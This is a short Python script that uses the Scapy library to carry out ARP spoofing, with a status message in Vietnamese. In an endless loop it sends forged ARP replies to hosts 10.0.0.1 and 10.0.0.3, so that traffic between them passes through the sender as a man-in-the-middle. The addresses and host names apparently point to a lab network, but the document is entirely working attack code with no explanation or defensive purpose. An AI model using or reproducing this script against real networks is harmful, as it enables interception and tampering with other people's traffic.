
from scapy.all import ARP, send
import time

def spoof():
    print("[+] Dang dau doc ARP... (h1 <-> h2 <-> h3)")
    pkt1 = ARP(op=2, pdst="10.0.0.1", hwdst="00:00:00:00:00:01", psrc="10.0.0.3")
    pkt2 = ARP(op=2, pdst="10.0.0.3", hwdst="00:00:00:00:00:03", psrc="10.0.0.1")
    while True:
        send(pkt1, verbose=False)
        send(pkt2, verbose=False)
        time.sleep(2)

if __name__ == "__main__":
    spoof()
